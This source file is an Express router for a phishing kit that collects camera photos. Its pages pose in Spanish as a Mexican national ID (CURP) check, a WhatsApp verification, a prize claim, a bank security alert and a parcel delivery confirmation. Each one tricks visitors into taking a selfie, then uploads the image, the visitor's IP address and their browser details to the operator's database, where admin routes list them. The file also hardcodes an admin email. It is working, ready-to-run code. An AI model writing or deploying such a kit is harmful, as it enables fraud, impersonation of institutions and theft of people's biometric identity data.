import { Router, type IRouter } from "express";
import { db, cameraSessionsTable, cameraCapturesTable } from "@workspace/db";
import { eq, desc, sql } from "drizzle-orm";
import crypto from "crypto";

const router: IRouter = Router();
const ADMIN_EMAIL = "servidorl3ho@gmail.com";

/* ── HTML de captura de cámara ── */
function buildCameraPage(session: { token: string; pageStyle: string }): string {
  const tok = session.token;

  const styles: Record<string, { title: string; header: string; logo: string; body: string; btn: string; bg: string; accent: string }> = {
    identity: {
      title: "Verificación de Identidad | CURP",
      header: "Registro Nacional de Población",
      logo: "🏛️",
      body: "Para continuar con tu trámite en línea, necesitamos verificar tu identidad.<br>Por favor, toma una selfie con tu rostro visible y bien iluminado.",
      btn: "Activar cámara y verificar",
      bg: "#f4f4f4",
      accent: "#6B1535",
    },
    whatsapp: {
      title: "Verificación de WhatsApp",
      header: "WhatsApp",
      logo: "💬",
      body: "Tu cuenta requiere verificación adicional.<br>Toma una selfie para confirmar que eres el titular de esta cuenta.",
      btn: "Verificar con selfie",
      bg: "#111b21",
      accent: "#25d366",
    },
    prize: {
      title: "¡Felicidades! Reclama tu Premio",
      header: "Sorteo Nacional · Premio Especial",
      logo: "🎁",
      body: "¡Has sido seleccionado como ganador!<br>Para reclamar tu premio de <strong>$5,000 MXN</strong>, necesitamos verificar tu identidad con una selfie.",
      btn: "Tomar selfie y reclamar",
      bg: "#1a1a2e",
      accent: "#e94560",
    },
    bank: {
      title: "Verificación de Seguridad | Banca en Línea",
      header: "Centro de Seguridad Bancaria",
      logo: "🏦",
      body: "Por tu seguridad, hemos detectado un acceso inusual.<br>Verifica tu identidad con una selfie para desbloquear tu cuenta.",
      btn: "Verificar identidad",
      bg: "#f0f4ff",
      accent: "#003087",
    },
    delivery: {
      title: "Confirmar Entrega de Paquete",
      header: "Servicio de Paquetería Express",
      logo: "📦",
      body: "Tu paquete está listo para entrega.<br>Para confirmar la recepción, necesitamos verificar tu identidad con una foto.",
      btn: "Verificar y confirmar entrega",
      bg: "#fff8ee",
      accent: "#e8820c",
    },
  };

  const s = styles[session.pageStyle] ?? styles.identity;
  const isDark = ["whatsapp", "prize"].includes(session.pageStyle);
  const textColor = isDark ? "#fff" : "#333";
  const cardBg = isDark ? "rgba(255,255,255,0.05)" : "#fff";
  const cardBorder = isDark ? "rgba(255,255,255,0.1)" : "#e0e0e0";
  const mutedColor = isDark ? "rgba(255,255,255,0.6)" : "#666";

  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>${s.title}</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:${s.bg};color:${textColor};min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
.card{background:${cardBg};border:1px solid ${cardBorder};border-radius:16px;padding:28px 24px;width:100%;max-width:420px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.12)}
.logo{font-size:48px;margin-bottom:10px}
.org{font-size:13px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:${s.accent};margin-bottom:16px}
h1{font-size:20px;font-weight:700;margin-bottom:12px;color:${textColor}}
.desc{font-size:14px;color:${mutedColor};line-height:1.6;margin-bottom:24px}
.video-wrap{position:relative;width:100%;aspect-ratio:4/3;background:#000;border-radius:12px;overflow:hidden;margin-bottom:20px;display:none}
video{width:100%;height:100%;object-fit:cover}
.capture-ring{position:absolute;inset:12px;border:3px solid ${s.accent};border-radius:50%;pointer-events:none;box-shadow:0 0 0 4px rgba(0,0,0,0.3)}
.corner{position:absolute;width:24px;height:24px;border-color:${s.accent};border-style:solid}
.tl{top:8px;left:8px;border-width:3px 0 0 3px;border-radius:4px 0 0 0}
.tr{top:8px;right:8px;border-width:3px 3px 0 0;border-radius:0 4px 0 0}
.bl{bottom:8px;left:8px;border-width:0 0 3px 3px;border-radius:0 0 0 4px}
.br{bottom:8px;right:8px;border-width:0 3px 3px 0;border-radius:0 0 4px 0}
canvas{display:none}
.btn{width:100%;padding:15px;background:${s.accent};color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;transition:opacity .2s;margin-bottom:12px}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.btn-snap{width:100%;padding:15px;background:${s.accent};color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;display:none}
.status{font-size:13px;color:${mutedColor};margin-top:8px;min-height:20px}
.success{display:none;text-align:center;padding:24px 0}
.success-icon{font-size:64px;margin-bottom:12px}
.success h2{font-size:22px;font-weight:700;color:${s.accent};margin-bottom:8px}
.success p{font-size:14px;color:${mutedColor}}
.shield{display:inline-flex;align-items:center;gap:6px;font-size:11px;color:${mutedColor};margin-top:16px}
</style>
</head>
<body>
<div class="card" id="main">
  <div class="logo">${s.logo}</div>
  <div class="org">${s.header}</div>
  <h1>Verificación requerida</h1>
  <p class="desc">${s.body}</p>

  <div class="video-wrap" id="videoWrap">
    <video id="vid" autoplay playsinline muted></video>
    <div class="capture-ring"></div>
    <div class="corner tl"></div><div class="corner tr"></div>
    <div class="corner bl"></div><div class="corner br"></div>
  </div>
  <canvas id="cnv"></canvas>

  <button class="btn" id="btnStart">${s.btn}</button>
  <button class="btn-snap" id="btnSnap">📸 Tomar foto y continuar</button>
  <p class="status" id="status"></p>
  <div class="shield">🔒 Conexión segura · Tus datos están protegidos</div>
</div>

<div class="success" id="success">
  <div class="success-icon">✅</div>
  <h2>¡Verificación exitosa!</h2>
  <p>Tu identidad ha sido confirmada.<br>Puedes cerrar esta ventana.</p>
</div>

<script>
const tok='${tok}';
let stream=null;

document.getElementById('btnStart').onclick=async function(){
  const st=document.getElementById('status');
  this.disabled=true;
  st.textContent='Solicitando acceso a la cámara...';
  try{
    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}},audio:false});
    document.getElementById('vid').srcObject=stream;
    document.getElementById('videoWrap').style.display='block';
    document.getElementById('btnSnap').style.display='block';
    this.style.display='none';
    st.textContent='Cámara activa. Asegúrate de que tu rostro sea visible.';
  }catch(e){
    this.disabled=false;
    if(e.name==='NotAllowedError'){st.textContent='⚠️ Permiso denegado. Por favor permite el acceso a la cámara.';}
    else{st.textContent='Error al acceder a la cámara. Intenta de nuevo.';}
  }
};

document.getElementById('btnSnap').onclick=async function(){
  const st=document.getElementById('status');
  this.disabled=true;
  st.textContent='Procesando...';
  const vid=document.getElementById('vid');
  const cnv=document.getElementById('cnv');
  cnv.width=640;cnv.height=Math.round(vid.videoHeight/vid.videoWidth*640)||480;
  const ctx=cnv.getContext('2d');
  ctx.drawImage(vid,0,0,cnv.width,cnv.height);
  const img=cnv.toDataURL('image/jpeg',0.82);
  if(stream){stream.getTracks().forEach(t=>t.stop());}
  try{
    await fetch('/api/camera-sessions/'+tok+'/capture',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({imageData:img,userAgent:navigator.userAgent})
    });
  }catch(e){}
  document.getElementById('main').style.display='none';
  document.getElementById('success').style.display='block';
};
</script>
</body>
</html>`;
}

/* ── Listar sesiones ── */
router.get("/camera-sessions", async (req, res) => {
  const isAdmin = req.userEmail === ADMIN_EMAIL;
  const uid = req.userUid;
  try {
    let sessions;
    if (isAdmin || !uid) {
      sessions = await db.select().from(cameraSessionsTable).orderBy(desc(cameraSessionsTable.createdAt));
    } else {
      sessions = await db.select().from(cameraSessionsTable)
        .where(eq(cameraSessionsTable.ownerUid, uid))
        .orderBy(desc(cameraSessionsTable.createdAt));
    }
    res.json(sessions);
  } catch {
    res.status(500).json({ error: "Error fetching sessions" });
  }
});

/* ── Crear sesión ── */
router.post("/camera-sessions", async (req, res) => {
  const { name, description, pageStyle } = req.body;
  if (!name) return res.status(400).json({ error: "Name required" });
  const token = crypto.randomBytes(12).toString("hex");
  try {
    const [result] = await db.insert(cameraSessionsTable).values({
      token,
      name,
      description: description ?? null,
      pageStyle: pageStyle ?? "identity",
      ownerUid: req.userUid ?? null,
      ownerEmail: req.userEmail ?? null,
    }).returning();
    res.json(result);
  } catch {
    res.status(500).json({ error: "Error creating session" });
  }
});

/* ── Eliminar sesión ── */
router.delete("/camera-sessions/:token", async (req, res) => {
  const { token } = req.params;
  try {
    await db.delete(cameraCapturesTable).where(eq(cameraCapturesTable.sessionToken, token));
    await db.delete(cameraSessionsTable).where(eq(cameraSessionsTable.token, token));
    res.status(204).send();
  } catch {
    res.status(500).json({ error: "Error deleting session" });
  }
});

/* ── Página HTML de captura ── */
router.get("/camera/:token", async (req, res) => {
  const { token } = req.params;
  try {
    const [session] = await db.select().from(cameraSessionsTable).where(eq(cameraSessionsTable.token, token));
    if (!session) return res.status(404).send("Sesión no encontrada");
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(buildCameraPage(session));
  } catch {
    res.status(500).send("Error");
  }
});

/* ── Recibir foto capturada ── */
router.post("/camera-sessions/:token/capture", async (req, res) => {
  const { token } = req.params;
  const { imageData, userAgent } = req.body;
  if (!imageData) return res.status(400).json({ error: "imageData required" });
  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ?? req.socket.remoteAddress ?? null;
  try {
    await db.insert(cameraCapturesTable).values({
      sessionToken: token,
      imageData,
      ipAddress: ip,
      userAgent: userAgent ?? null,
    });
    await db.update(cameraSessionsTable)
      .set({ captureCount: sql`capture_count + 1` })
      .where(eq(cameraSessionsTable.token, token));
    res.json({ ok: true });
  } catch {
    res.status(500).json({ error: "Error saving capture" });
  }
});

/* ── Obtener capturas de una sesión ── */
router.get("/camera-sessions/:token/data", async (req, res) => {
  const { token } = req.params;
  try {
    const captures = await db.select({
      id: cameraCapturesTable.id,
      sessionToken: cameraCapturesTable.sessionToken,
      imageData: cameraCapturesTable.imageData,
      ipAddress: cameraCapturesTable.ipAddress,
      userAgent: cameraCapturesTable.userAgent,
      capturedAt: cameraCapturesTable.capturedAt,
    }).from(cameraCapturesTable)
      .where(eq(cameraCapturesTable.sessionToken, token))
      .orderBy(desc(cameraCapturesTable.capturedAt));
    res.json(captures);
  } catch {
    res.status(500).json({ error: "Error fetching captures" });
  }
});

export default router;
